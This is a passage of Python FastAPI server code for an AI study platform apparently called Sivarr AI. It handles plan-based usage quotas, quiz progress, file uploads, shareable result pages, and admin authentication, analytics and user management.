    "Student Pro":  {"spaces": 3,    "templates": None, "integrations": 5,    "analytics_days": None, "ai_chat_daily": STUDENT_DAILY_CHAT,  "ai_actions_daily": STUDENT_DAILY_AI},
    "Educator Pro": {"spaces": 3,    "templates": None, "integrations": 5,    "analytics_days": None, "ai_chat_daily": PRO_DAILY_CHAT,      "ai_actions_daily": PRO_DAILY_AI},
    "Pro":          {"spaces": 3,    "templates": None, "integrations": 5,    "analytics_days": None, "ai_chat_daily": PRO_DAILY_CHAT,      "ai_actions_daily": PRO_DAILY_AI},
    "Creator":      {"spaces": None, "templates": None, "integrations": None, "analytics_days": None, "ai_chat_daily": CREATOR_DAILY_CHAT,  "ai_actions_daily": CREATOR_DAILY_AI},
    "Team":         {"spaces": None, "templates": None, "integrations": None, "analytics_days": None, "ai_chat_daily": CREATOR_DAILY_CHAT,  "ai_actions_daily": CREATOR_DAILY_AI},
}

def _plan_name(p: dict) -> str:
    """The user's effective plan name ('Free' if no active paid sub)."""
    if _plan_is_active(p):
        return (p.get("subscription") or {}).get("name", "Pro")
    return "Free"

def _plan_caps(p: dict) -> dict:
    """Feature caps for this user's plan. None = unlimited."""
    return _PLAN_CAPS.get(_plan_name(p), _PLAN_CAPS["Free"])

def _integration_block(p: dict, which: str) -> bool:
    """True if connecting third-party `which` would exceed the plan's integration
    cap. Re-connecting an already-linked provider is always allowed.
    (`_user_integrations` is defined later; resolved at call time.)"""
    cap = _plan_caps(p).get("integrations")
    if cap is None:
        return False
    current = _user_integrations(p)
    if current.get(which):
        return False
    return sum(1 for v in current.values() if v) >= cap

def _integration_limit_msg(p: dict) -> str:
    cap = _plan_caps(p).get("integrations")
    return f"Your plan includes {cap} integration{'s' if cap != 1 else ''}. Upgrade to connect more."

def _org_sub_active(org: dict) -> bool:
    """True if the org holds an active, non-expired seat subscription."""
    sub = ((org or {}).get("settings") or {}).get("subscription") or {}
    if sub.get("status") != "active":
        return False
    exp = sub.get("expires")
    if exp:
        try:
            if datetime.datetime.utcnow() > datetime.datetime.strptime(exp, "%Y-%m-%d"):
                return False
        except ValueError:
            pass
    return True


def _chat_authorize(token: str) -> tuple[str, dict]:
    """Authenticate an AI-chat request and enforce the free-tier daily cap.

    Returns (sid, progress) with the daily counter already incremented for
    free users (persisted when the caller saves progress). Raises 401 if the
    token is missing/expired, 429 if the free quota is exhausted. Paid plans
    are unmetered.
    """
    sess = get_session_from_token(token)
    if not sess:
        raise HTTPException(401, "Sign in to chat with Sivarr.")
    sid = sess["sid"]
    p   = load_progress(sid)
    # Every plan has a daily chat ceiling (free = low, paid = high fair-use cap)
    # so no single account can run up a runaway Gemini bill. None = unlimited.
    limit = _plan_caps(p).get("ai_chat_daily")
    if limit is not None:
        today = datetime.date.today().isoformat()
        dc = p.get("chat_daily") or {}
        if dc.get("date") != today:
            dc = {"date": today, "count": 0}
        if dc["count"] >= limit:
            if _plan_is_active(p):
                raise HTTPException(
                    429,
                    f"You've reached today's fair-use limit of {limit} AI messages. "
                    f"It resets tomorrow. Reach out to support if you regularly need more.",
                )
            raise HTTPException(
                429,
                f"You've reached today's free limit of {limit} messages. "
                f"Upgrade to Pro for more.",
            )
        dc["count"] += 1
        p["chat_daily"] = dc
    return sid, p


from routes.ai_chat import build_router as _build_ai_chat_router
app.include_router(_build_ai_chat_router(_chat_authorize, load_progress, save_progress, add_history))


def _ai_meter(sid: str) -> None:
    """Per-user daily cap across the non-chat AI endpoints (study deck/plan, write
    assist, task extraction, weekly review). Free tier only — paid plans unmetered.
    Raises 429 when the day's allowance is spent. The 'ai_daily' counter is separate
    from chat_daily and persisted immediately so it holds across requests/workers."""
    if not sid:
        return
    p = load_progress(sid)
    # Per-plan daily ceiling on non-chat AI (free = low, paid = high fair-use cap).
    limit = _plan_caps(p).get("ai_actions_daily")
    if limit is None:
        return
    today = datetime.date.today().isoformat()
    dc = p.get("ai_daily") or {}
    if dc.get("date") != today:
        dc = {"date": today, "count": 0}
    if dc["count"] >= limit:
        if _plan_is_active(p):
            raise HTTPException(
                429,
                f"You've reached today's fair-use limit of {limit} AI actions. "
                f"It resets tomorrow. Reach out to support if you regularly need more.",
            )
        raise HTTPException(
            429,
            f"You've reached today's free limit of {limit} AI actions. "
            f"Upgrade to Pro for more.",
        )
    dc["count"] += 1
    p["ai_daily"] = dc
    save_progress(sid, p)


from routes.ai_features import build_router as _build_ai_features_router
app.include_router(_build_ai_features_router(_ai_meter))


# /api/chat and /api/chat/stream now live in routes/ai_chat.py.


# /api/quiz/question, /api/quiz/submit, /api/quiz/complete now live in
# routes/quiz.py.


@app.get("/api/progress")
async def progress(sid: str, token: str = ""):
    sid   = sanitize_text(sid, 100)
    entry = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not entry or entry.get("sid") != sid:
        raise HTTPException(401, "Invalid or missing session token.")
    p       = load_progress(sid)
    quizzes = p.get("quizzes", [])
    avg     = (sum(q["score"] for q in quizzes) / len(quizzes) * 100) if quizzes else 0

    # Quiz trend — last 10 with dates for sparkline
    quiz_history = [
        {"pct": q.get("pct", 0), "topic": q.get("topic",""), "date": q.get("date","")}
        for q in quizzes[-10:]
    ]

    # Topic mastery — convert count to mastery %
    topics = p.get("topics", {})
    max_count = max(topics.values()) if topics else 1
    topic_mastery = {t: min(round((c / max_count) * 100), 100) for t, c in topics.items()}

    # Streak calculation
    streak = p.get("streak", 0)
    last_active = p.get("last_active", "")
    today = datetime.date.today().isoformat()
    yesterday = (datetime.date.today() - datetime.timedelta(days=1)).isoformat()
    if last_active not in [today, yesterday]:
        streak = 0

    # Best topic
    best_topic = max(topics, key=topics.get) if topics else None

    # Study sessions this week
    chat_hist = p.get("chat_history", [])
    week_ago = (datetime.date.today() - datetime.timedelta(days=7)).isoformat()
    sessions_week = len(set(
        h.get("time","")[:10] for h in chat_hist
        if h.get("time","")[:10] >= week_ago
    ))

    return {
        "name": p.get("name",""), "matric": p.get("matric",""),
        "sessions": p["sessions"], "questions": p["questions"],
        "topics": topics, "weak": weak_topics(p),
        "difficulty": p.get("difficulty","medium"),
        "quizzes_taken": len(quizzes), "avg_score": round(avg, 1),
        "last_quiz": quizzes[-1] if quizzes else None,
        "wrong_count": len(p.get("wrong_answers",[])),
        "uploaded_files": p.get("uploaded_files",[]),
        "quiz_history": quiz_history,
        "topic_mastery": topic_mastery,
        "streak": streak,
        "best_topic": best_topic,
        "sessions_week": sessions_week,
        "xp": p.get("xp", 0),
        "level": p.get("level", 1),
        "badges": p.get("badges", []),
    }


@app.get("/api/suggest")
async def suggest(request: Request, sid: str = "", token: str = ""):
    # Auth is by session token only; the `sid` query param is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    key = get_client_key(request, sid)
    check_rate_limit(key, 5, "suggest")

    p      = load_progress(sid)
    topics = list(p["topics"].keys())
    if not topics:
        return {"suggestion": "Study some topics first and I will tailor suggestions for you!"}
    quizzes = p.get("quizzes",[])
    qs = (f"avg {sum(q['score'] for q in quizzes)/len(quizzes)*100:.0f}% across {len(quizzes)} quizzes"
          if quizzes else "no quizzes yet")
    result = await async_gemini_once(SUGGESTION_PROMPT.format(
        name=p.get("name","Student"), topics=", ".join(topics),
        weak=", ".join(weak_topics(p)) or "none",
        quiz_summary=qs, difficulty=p.get("difficulty","medium"),
    ), temp=0.6, tokens=250)
    return {"suggestion": result or "Could not generate suggestions right now."}


@app.post("/api/difficulty")
async def set_difficulty(req: DifficultyRequest):
    # Auth is by session token only; the body `sid` is ignored (IDOR fix).
    sess = get_session_from_token(sanitize_text(req.token, 100)) if req.token else None
    if not sess:
        raise HTTPException(401, "Invalid session.")
    sid = sess["sid"]
    p = load_progress(sid)
    p["difficulty"] = req.level
    save_progress(sid, p)
    return {"ok": True, "level": req.level}


@app.get("/api/wrong")
async def get_wrong(sid: str, token: str = ""):
    sid   = validate_sid(sid)
    entry = get_session_from_token(sanitize_text(token, 100)) if token else None
    if not entry or entry.get("sid") != sid:
        raise HTTPException(401, "Invalid or missing session token.")
    p = load_progress(sid)
    return {"wrong": p.get("wrong_answers",[])}


@app.post("/api/wrong/clear")
async def clear_wrong(data: dict):
    sid, _ = _resolve_token(data)   # IDOR fix: sid from session token, body sid ignored
    p     = load_progress(sid)
    wrong = p.get("wrong_answers", [])
    # W1 fix: support "clear all" (the client's reset path sends index:'all').
    if data.get("all") is True or str(data.get("index", "")).lower() == "all":
        wrong = []
    else:
        try:
            idx = int(data.get("index", -1))
        except (ValueError, TypeError):
            idx = -1
        if 0 <= idx < len(wrong):
            wrong.pop(idx)
    p["wrong_answers"] = wrong
    save_progress(sid, p)
    return {"ok": True, "remaining": len(wrong)}


@app.post("/api/reset-progress")
async def reset_progress(data: dict):
    """Wipe the authenticated user's learning stats — quizzes, topics, XP,
    streak, revision list, chat history and daily AI counters. PRESERVES
    account identity (name/matric), subscription/billing, uploaded study
    files and any other keys. Token-authed; body sid is ignored (IDOR-safe)."""
    sid, _ = _resolve_token(data)
    p = load_progress(sid)
    # Fresh literals each call so no mutable default is shared across users.
    p.update({
        "sessions": 0, "questions": 0, "topics": {},
        "quizzes": [], "wrong_answers": [], "chat_history": [],
        "xp": 0, "streak": 0, "difficulty": "medium",
        "chat_daily": {}, "ai_daily": {},
    })
    save_progress(sid, p)
    return {"ok": True}


# /api/chat/clear now lives in routes/ai_chat.py.


@app.post("/api/account/delete")
async def account_delete(data: dict):
    """Self-serve account deletion — deletes the CALLER's own data (token-authed;
    body sid ignored). Distinct from the admin delete endpoint."""
    sid, _ = _resolve_token(data)
    users = load_users()
    users.pop(sid, None)
    save_users(users)
    try:
        pf = ppath(sid)
        if pf.exists():
            pf.unlink()
    except Exception:
        pass
    if db.is_available():
        try:
            db.delete_user_cascade(sid)
        except Exception as e:
            log.error(f"account_delete cascade failed: {e}")
    for t in [t for t, v in _session_tokens.items() if v.get("sid") == sid]:
        delete_session_token(t)
    log.info(f"User self-deleted account {sid[:12]}")
    return {"ok": True}


# ── File Upload ───────────────────────────────────────────────

_FILE_MAGIC: dict[str, bytes] = {
    ".pdf": b"%PDF",
}
# Binary-content rejection: reject files claiming to be text but >30% non-text bytes
_TEXT_EXTS = {".txt", ".md"}

def _validate_file_magic(content: bytes, ext: str) -> bool:
    """Check that file bytes match the declared extension."""
    magic = _FILE_MAGIC.get(ext)
    if magic and not content.startswith(magic):
        return False
    if ext in _TEXT_EXTS:
        sample = content[:512]
        if sample:
            non_text = sum(1 for b in sample if b < 32 and b not in (9, 10, 13))
            if non_text / len(sample) > 0.30:
                return False
    return True


def _extract_file_text(content: bytes, ext: str) -> str:
    """CPU-bound text extraction — always call via asyncio.to_thread."""
    if ext == ".pdf":
        try:
            import io as _io
            try:
                import pypdf
                reader = pypdf.PdfReader(_io.BytesIO(content))
                return "\n".join(page.extract_text() or "" for page in reader.pages)
            except ImportError:
                return content.decode("utf-8", errors="ignore")
        except Exception as exc:
            log.error(f"PDF parse error: {exc}")
            return content.decode("utf-8", errors="ignore")
    return content.decode("utf-8", errors="ignore")


@app.post("/api/upload")
async def upload_file(request: Request, token: str = Form(""), file: UploadFile = File(...)):
    # Auth by session token (was: trusted a spoofable `sid` form field — IDOR fix).
    sess = get_session_from_token(sanitize_text(token, 100))
    if not sess:
        raise HTTPException(401, "Sign in to upload files.")
    sid = validate_sid(sess["sid"])  # still sanitized — sid is interpolated into the upload path
    key = get_client_key(request, sid)
    check_rate_limit(key, RATE_LIMIT_UPLOAD, "upload")

    allowed = [".txt", ".pdf", ".md"]
    ext     = Path(file.filename).suffix.lower()
    if ext not in allowed:
        raise HTTPException(400, "Use .txt, .pdf, or .md files only.")

    # Reject oversized uploads via the declared length BEFORE reading the body into
    # memory (defence-in-depth; the post-read check below still guards a lying header).
    clen = request.headers.get("content-length")
    if clen and clen.isdigit() and int(clen) > MAX_FILE_SIZE + 8192:
        raise HTTPException(400, "File too large. Maximum size is 5MB.")

    content = await file.read()

    if len(content) > MAX_FILE_SIZE:
        raise HTTPException(400, "File too large. Maximum size is 5MB.")
    if not _validate_file_magic(content, ext):
        raise HTTPException(400, "File content does not match its extension.")

    # CPU-bound PDF parsing and disk write both run in a thread
    text = await asyncio.to_thread(_extract_file_text, content, ext)
    text = sanitize_text(text, 10000)
    if not text.strip():
        raise HTTPException(400, "Could not extract text from file.")

    file_id = str(uuid.uuid4())[:8]
    fpath   = UPLOADS_DIR / f"{sid}_{file_id}.txt"
    await asyncio.to_thread(fpath.write_text, text)

    p = load_progress(sid)
    p.setdefault("uploaded_files", []).append({
        "id": file_id,
        "name": sanitize_text(file.filename, 200),
        "date": datetime.date.today().isoformat(),
    })
    save_progress(sid, p)

    log.info(f"File uploaded: {file.filename} by {sid[:20]}")
    summary = await async_gemini_once(FILE_SUMMARY_PROMPT.format(text=text[:3000]), temp=0.5, tokens=600)
    return {
        "file_id": file_id,
        "filename": file.filename,
        "summary": summary or "File uploaded! You can now quiz yourself on it.",
    }
   

# ── Share Results ─────────────────────────────────────────────

@app.post("/api/share")
async def create_share(request: Request, data: dict):
    key = get_client_key(request)
    check_rate_limit(key, 10, "share")

    share_id   = str(uuid.uuid4())[:10]
    share_data = {
        "id":      share_id,
        "type":    sanitize_text(str(data.get("type","quiz")), 20),
        "name":    sanitize_text(str(data.get("name","Student")), MAX_NAME_LEN),
        "score":   min(max(int(data.get("score",0)), 0), 5),
        "topic":   sanitize_text(str(data.get("topic","General")), 100),
        "diff":    data.get("difficulty","medium") if data.get("difficulty") in ["easy","medium","hard"] else "medium",
        "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    (SHARES_DIR / f"{share_id}.json").write_text(json.dumps(share_data, indent=2), encoding="utf-8")
    log.info(f"Share created: {share_id} by {share_data['name']}")
    return {"share_id": share_id, "url": f"/share/{share_id}"}


@app.get("/share/{share_id}", response_class=HTMLResponse)
async def view_share(share_id: str):
    share_id   = re.sub(r"[^a-zA-Z0-9\-]", "", share_id)[:20]
    share_path = SHARES_DIR / f"{share_id}.json"
    if not share_path.exists():
        return HTMLResponse("<h2>Share link not found.</h2>", status_code=404)
    d   = json.loads(share_path.read_text(encoding="utf-8"))
    pct = int((d.get("score",0) / 5) * 100)
    emoji = "🏆" if pct==100 else "🌟" if pct>=80 else "📝"
    return HTMLResponse(f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sivarr AI · {d['name']}'s Results</title>
<meta property="og:title" content="{d['name']} scored {pct}% on Sivarr AI!">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;800&display=swap" rel="stylesheet">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#08090d;color:#f0f1f5;font-family:'Outfit',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem}}
.card{{background:#13151c;border:1px solid #1c1f2a;border-radius:20px;padding:2.5rem;max-width:380px;width:100%;text-align:center}}
.mono{{width:36px;height:36px;background:linear-gradient(135deg,#4f6ef7,#7c3aed);border-radius:9px;display:inline-flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;margin-bottom:1.5rem}}
.score{{font-size:3.5rem;font-weight:800;background:linear-gradient(135deg,#4f6ef7,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}}
.meta{{color:#5a5f7a;margin:.5rem 0 1.5rem;font-size:.9rem}}
.pill{{display:inline-block;background:#4f6ef715;border:1px solid #4f6ef730;color:#4f6ef7;padding:4px 14px;border-radius:20px;font-size:.8rem;margin:3px}}
.cta{{margin-top:1.5rem;background:linear-gradient(135deg,#4f6ef7,#7c3aed);color:#fff;border:none;border-radius:10px;padding:11px 24px;font-family:'Outfit',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;text-decoration:none;display:inline-block}}
</style></head><body>
<div class="card">
<div class="mono">Sr</div>
<div style="font-size:2.5rem">{emoji}</div>
<div class="score">{d.get('score',0)}/5</div>
<div style="font-weight:700;font-size:1.1rem;margin:.3rem 0">{d['name']}</div>
<div class="meta">scored {pct}% on {d.get('topic','General').title()}</div>
<span class="pill">{d.get('diff','medium').title()}</span>
<span class="pill">{d.get('created','')}</span><br><br>
<a href="/" class="cta">Try Sivarr AI →</a>
</div></body></html>""")


# ── Admin ─────────────────────────────────────────────────────

@app.post("/api/admin/login")
async def admin_login(req: AdminLoginRequest, request: Request):
    key = get_client_key(request)
    check_rate_limit(key, 5, "admin_login")  # Extra strict for admin
    if not (ADMIN_PASSWORD and hmac.compare_digest(req.password, ADMIN_PASSWORD)):
        log.warning(f"Failed admin login attempt from {key}")
        raise HTTPException(401, "Invalid password")
    # P4: second factor. Enforced only when ADMIN_TOTP_SECRET is configured, so
    # existing deployments keep working until 2FA is turned on. The per-attempt
    # rate limit above (5) also bounds TOTP brute-force.
    if ADMIN_TOTP_SECRET and not _totp_verify(ADMIN_TOTP_SECRET, req.totp):
        log.warning(f"Admin login: invalid/missing 2FA code from {key}")
        raise HTTPException(401, "Invalid or missing 2FA code")
    log.info(f"Admin login successful from {key}")
    token = _create_admin_session()
    return {"ok": True, "token": token}


@app.post("/api/admin/logout")
async def admin_logout(data: dict):
    """Explicitly revoke this admin token now, instead of letting it linger
    valid for up to 2h after the browser discards it client-side. Previously
    'Sign out' only cleared local storage — the token itself stayed usable
    against the API until it naturally expired, and the only way to kill one
    compromised admin session early was rotating ADMIN_PASSWORD for everyone."""
    token = data.get("token", "")
    try:
        ts = int(token.split("_")[1])
    except (IndexError, ValueError):
        return {"ok": True}
    _revoke_priv_session(token, ts)
    return {"ok": True}


@app.get("/api/admin/students")
async def admin_students(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    students = get_all_students()
    total_q  = sum(s["questions"] for s in students)
    total_qz = sum(s["quizzes"] for s in students)
    avg_all  = (sum(s["avg_score"] for s in students) / len(students)) if students else 0
    return {
        "students": students, "total": len(students),
        "total_questions": total_q, "total_quizzes": total_qz,
        "avg_score": round(avg_all, 1),
    }


def get_all_students_full():
    """Extended student list — includes sid, email, and topic distribution."""
    users_map = load_users()  # sid → user dict (has email)
    students  = []
    for f in DATA_DIR.glob("*_progress.json"):
        if "backup" in f.name:
            continue
        sid = f.stem.replace("_progress", "")
        try:
            data    = json.loads(f.read_text(encoding="utf-8"))
            quizzes = data.get("quizzes", [])
            avg     = (sum(q["score"] for q in quizzes) / len(quizzes) * 100) if quizzes else 0
            topics  = data.get("topics", {})
            # Email: prefer DB/users.json over progress file
            user_row = users_map.get(sid, {})
            email = user_row.get("email") or data.get("email", "")
            students.append({
                "sid":        sid,
                "name":       data.get("name", "Unknown"),
                "email":      email,
                "matric":     data.get("matric", "N/A"),
                "sessions":   data.get("sessions", 0),
                "questions":  data.get("questions", 0),
                "quizzes":    len(quizzes),
                "avg_score":  round(avg, 1),
                "topics":     sorted(topics.keys(), key=lambda t: -topics[t])[:8],
                "weak":       sorted(topics, key=lambda t: topics[t])[:3] if topics else [],
                "wrong_count": len(data.get("wrong_answers", [])),
                "difficulty": data.get("difficulty", "medium"),
                "last_seen":  data.get("chat_history", [{}])[-1].get("time", "Never") if data.get("chat_history") else "Never",
                "created_at": data.get("created_at", ""),
            })
        except Exception as e:
            log.error(f"admin: error reading {f}: {e}")
    return sorted(students, key=lambda s: s["sessions"], reverse=True)


@app.get("/api/admin/overview")
async def admin_overview(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    students = get_all_students_full()
    total_q  = sum(s["questions"] for s in students)
    total_qz = sum(s["quizzes"]   for s in students)
    avg_all  = round((sum(s["avg_score"] for s in students) / len(students)), 1) if students else 0

    # Difficulty breakdown
    diff_counts = {"easy": 0, "medium": 0, "hard": 0}
    for s in students:
        diff_counts[s["difficulty"]] = diff_counts.get(s["difficulty"], 0) + 1

    # Topic frequency
    topic_freq: dict = {}
    for s in students:
        for t in s["topics"]:
            topic_freq[t] = topic_freq.get(t, 0) + 1
    top_topics = sorted(topic_freq.items(), key=lambda x: -x[1])[:8]

    # DB stats (if available)
    db_stats = db.get_platform_stats() if db.is_available() else {}
    active_sessions_db = db_stats.get("active_sessions", len(_session_tokens))
    spaces_by_type     = db_stats.get("spaces_by_type", {})
    total_spaces       = db_stats.get("total_spaces", 0)

    # Recent sessions (last 5 in-memory)
    now = datetime.datetime.utcnow()
    recent = sorted(
        [{"name": v["name"], "email": v["email"], "expires": str(v["expires"])}
         for v in _session_tokens.values() if v.get("expires", now) > now],
        key=lambda x: x["expires"], reverse=True
    )[:5]

    return {
        "total_users":    len(students),
        "active_sessions": active_sessions_db,
        "total_questions": total_q,
        "total_quizzes":   total_qz,
        "avg_score":       avg_all,
        "total_spaces":    total_spaces,
        "diff_counts":     diff_counts,
        "top_topics":      top_topics,
        "recent_sessions": recent,
        "spaces_by_type":  spaces_by_type,
        "db_available":    db.is_available(),
        "version":         VERSION,
    }


@app.get("/api/admin/users-full")
async def admin_users_full(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    return {"users": get_all_students_full()}


@app.get("/api/admin/sessions-list")
async def admin_sessions_list(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    # Prefer DB list; fall back to in-memory
    if db.is_available():
        sessions = db.get_all_sessions_admin()
    else:
        now = datetime.datetime.utcnow()
        sessions = [
            {
                "token":      t[:12] + "…",
                "token_full": t,
                "sid":        v["sid"],
                "name":       v["name"],
                "email":      v["email"],
                "created_at": None,
                "expires_at": str(v["expires"]),
            }
            for t, v in _session_tokens.items()
            if v.get("expires", now) > now
        ]
    return {"sessions": sessions, "count": len(sessions)}


@app.get("/api/admin/spaces-list")
async def admin_spaces_list(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    spaces = db.get_all_spaces_admin() if db.is_available() else []
    return {"spaces": spaces, "count": len(spaces)}


@app.post("/api/admin/user-delete")
async def admin_user_delete(data: dict):
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    sid = sanitize_text(str(data.get("sid", "")), 60)
    if not sid:
        raise HTTPException(400, "sid required")
    # Remove from JSON store
    users = load_users()
    users.pop(sid, None)
    save_users(users)
    # Remove progress file
    pf = ppath(sid)
    if pf.exists():
        pf.unlink()
    # Remove from DB cascade
    if db.is_available():
        db.delete_user_cascade(sid)
    # Kill any live sessions for this user
    tokens_to_kill = [t for t, v in _session_tokens.items() if v.get("sid") == sid]
    for t in tokens_to_kill:
        delete_session_token(t)
    log.info(f"Admin deleted user {sid}")
    return {"ok": True}


@app.post("/api/admin/session-kill")
async def admin_session_kill(data: dict):
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    target = str(data.get("target_token", ""))
    if not target:
        raise HTTPException(400, "target_token required")
    delete_session_token(target)
    return {"ok": True}


@app.get("/api/admin/announcements-list")
async def admin_announcements_list(token: str):
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    data = load_announcements()
    return {"announcements": data}


@app.post("/api/admin/announcement-create")
async def admin_announcement_create(data: dict):
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    text = sanitize_text(str(data.get("text", "")), 500)
    atype = str(data.get("type", "info"))
    if atype not in ["info", "warning", "deadline", "exam"]:
        atype = "info"
    if not text:
        raise HTTPException(400, "text required")
    anns = load_announcements()
    anns.append({
        "text":     text,
        "type":     atype,
        "lecturer": "Admin",
        "date":     datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    save_announcements(anns)
    return {"ok": True}


@app.post("/api/admin/announcement-delete")
async def admin_announcement_delete(data: dict):
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    idx  = int(data.get("index", -1))
    anns = load_announcements()
    if 0 <= idx < len(anns):
        anns.pop(idx)
        save_announcements(anns)
    return {"ok": True}


@app.post("/api/admin/cleanup-sessions")
async def admin_cleanup_sessions(data: dict):
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    count = db.cleanup_db_sessions() if db.is_available() else 0
    cleanup_expired_tokens()
    return {"ok": True, "removed": count}


# ═══════════════════════════════════════════════════════════════
#  ADMIN ANALYTICS — revenue · user drill-down · AI health · growth
# ═══════════════════════════════════════════════════════════════

def _admin_iter_progress():
    """Yield (sid, progress_dict, user_row) for every user. Reads the JSON
    progress files (always written as a backup by save_progress, so present even
    when Postgres is the primary store) and joins the users map for email."""
    users_map = load_users()
    for f in DATA_DIR.glob("*_progress.json"):
        if "backup" in f.name:
            continue
        sid = f.stem.replace("_progress", "")
        try:
            data = json.loads(f.read_text(encoding="utf-8"))
        except Exception:
            continue
        yield sid, data, users_map.get(sid, {})


def _parse_money(s) -> float:
    """'₦25,000' / '25000' → 25000.0."""
    if s is None:
        return 0.0
    digits = "".join(ch for ch in str(s) if ch.isdigit() or ch == ".")
    try:
        return float(digits) if digits else 0.0
    except ValueError:
        return 0.0


@app.get("/api/admin/revenue")
async def admin_revenue(token: str):
    """Subscription + revenue rollup: paying users, plan/gateway split, MRR
    estimate, all-time revenue and recent payments."""
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    paying = 0
    plan_counts: dict = {}
    gateway_counts: dict = {}
    mrr = 0.0
    all_time = 0.0
    payments: list = []
    for sid, data, urow in _admin_iter_progress():
        name  = data.get("name", "Unknown")
        email = urow.get("email") or data.get("email", "")
        # All-time revenue + recent payments from billing history
        for h in (data.get("billing_history") or []):
            amt = _parse_money(h.get("amount"))
            if str(h.get("status", "paid")) == "paid":
                all_time += amt
            payments.append({
                "date": h.get("date", ""), "plan": h.get("plan", ""),
                "amount": h.get("amount", ""), "amount_num": amt,
                "gateway": h.get("gateway", ""), "status": h.get("status", "paid"),
                "name": name, "email": email,
            })
        # Active subscription → counts + MRR
        if _plan_is_active(data):
            paying += 1
            sub = data.get("subscription") or {}
            plan_id = sub.get("plan", "")
            plan    = SIVARR_PLANS.get(plan_id, {})
            label   = plan.get("name") or sub.get("name") or plan_id or "Paid"
            plan_counts[label] = plan_counts.get(label, 0) + 1
            gw = sub.get("gateway", "unknown")
            gateway_counts[gw] = gateway_counts.get(gw, 0) + 1
            amount = plan_charge_ngn(plan)
            mrr += (amount / 12.0) if plan.get("period") == "yearly" else float(amount)
    payments.sort(key=lambda p: p.get("date", ""), reverse=True)
    return {
        "paying_users":   paying,
        "plan_counts":    plan_counts,
        "gateway_counts": gateway_counts,
        "mrr_ngn":        round(mrr),
        "arr_ngn":        round(mrr * 12),
        "all_time_ngn":   round(all_time),
        "recent_payments": payments[:25],
        "currency":       "NGN",
        "naira_rate":     get_naira_rate(),   # USD→NGN, for the dashboard $ toggle
    }


def _user_integrations(p: dict) -> dict:
    """Which third-party accounts this user has linked."""
    return {
        "github":     bool(p.get("github_token")),
        "google_cal": bool(p.get("google_cal_tokens", {}).get("refresh_token")),
        "mono":       bool(p.get("mono_account_id")),
        "metatrader": bool(p.get("metaapi_account_id")),
    }


@app.get("/api/admin/user-detail")
async def admin_user_detail(token: str, sid: str):
    """Full drill-down for a single user."""
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    sid = sanitize_text(sid, 60)
    p = load_progress(sid)
    if not p:
        raise HTTPException(404, "User not found")
    users_map = load_users()
    urow = users_map.get(sid, {})
    quizzes = p.get("quizzes", [])
    avg = round(sum(q.get("score", 0) for q in quizzes) / len(quizzes) * 100, 1) if quizzes else 0
    topics = p.get("topics", {}) or {}
    sub = p.get("subscription") or {}
    today = datetime.date.today().isoformat()
    ai_daily = p.get("ai_daily") or {}
    ai_today = ai_daily.get("count", 0) if ai_daily.get("date") == today else 0
    # Spaces owned by this user (best-effort via DB admin list)
    space_count = 0
    if db.is_available():
        try:
            space_count = sum(1 for s in db.get_all_spaces_admin() if s.get("sid") == sid)
        except Exception:
            space_count = 0
    return {
        "sid":        sid,
        "name":       p.get("name", "Unknown"),
        "email":      urow.get("email") or p.get("email", ""),
        "matric":     p.get("matric", ""),
        "created_at": p.get("created_at", ""),
        "verified":   db.is_email_verified(sid) if db.is_available() else None,
        "plan_active": _plan_is_active(p),
        "subscription": {
            "plan": sub.get("plan", "free"), "name": sub.get("name", "Free"),
            "status": sub.get("status", ""), "expires": sub.get("expires", ""),
            "gateway": sub.get("gateway", ""), "activated": sub.get("activated", ""),
        },
        "billing_history": (p.get("billing_history") or [])[:10],
        "integrations":  _user_integrations(p),
        "usage": {
            "sessions":  p.get("sessions", 0),
            "questions": p.get("questions", 0),
            "quizzes":   len(quizzes),
            "avg_score": avg,
            "ai_today":  ai_today,
            "wrong":     len(p.get("wrong_answers", [])),
            "spaces":    space_count,
        },
        "top_topics": sorted(topics.items(), key=lambda x: -x[1])[:8],
        "last_seen":  (p.get("chat_history", [{}])[-1].get("time", "") if p.get("chat_history") else ""),
    }


@app.post("/api/admin/user-grant-plan")
async def admin_user_grant_plan(data: dict):
    """Grant, change or revoke a user's subscription (admin comp / support)."""
    token = str(data.get("token", ""))
    if not _is_valid_admin_session(token):
        raise HTTPException(401, "Unauthorized")
    sid     = sanitize_text(str(data.get("sid", "")), 60)
    plan_id = sanitize_text(str(data.get("plan_id", "")), 40)
    if not sid:
        raise HTTPException(400, "sid required")
    p = load_progress(sid)
    if plan_id in ("", "free"):
        p.pop("subscription", None)
        save_progress(sid, p)
        log.info(f"Admin revoked plan for {sid}")
        return {"ok": True, "plan": "free"}
    plan = SIVARR_PLANS.get(plan_id)
    if not plan:
